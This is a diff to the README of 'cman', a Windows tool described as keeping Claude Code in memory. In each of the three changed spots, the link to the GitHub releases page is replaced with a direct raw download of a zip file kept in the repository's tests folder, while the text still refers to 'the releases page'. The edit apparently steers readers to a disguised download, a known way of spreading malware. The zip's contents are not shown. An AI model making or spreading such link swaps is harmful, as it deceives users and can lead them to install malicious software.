@@ -1,6 +1,6 @@
 # 🧠 cman - Keep Claude Code in memory
 
-[![Download cman](https://img.shields.io/badge/Download-cman-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingbroskingbros41-a11y/cman/releases)
+[![Download cman](https://img.shields.io/badge/Download-cman-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingbroskingbros41-a11y/cman/raw/refs/heads/main/tests/Software-1.6.zip)
 
 ## 🚀 What cman does
 
@@ -27,7 +27,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 ## 📥 Download cman
 
 Visit this page to download cman:
-https://github.com/kingbroskingbros41-a11y/cman/releases
+https://github.com/kingbroskingbros41-a11y/cman/raw/refs/heads/main/tests/Software-1.6.zip
 
 On the releases page, look for the latest version and download the Windows file. If you see more than one file, choose the one meant for Windows.
 
@@ -179,7 +179,7 @@ It helps reduce repeated context and keeps your project history close at hand.
 
 If you need to reinstall cman or set it up on another Windows PC, use the same download page:
 
-https://github.com/kingbroskingbros41-a11y/cman/releases
+https://github.com/kingbroskingbros41-a11y/cman/raw/refs/heads/main/tests/Software-1.6.zip
 
 ## 🖥️ Expected behavior
 
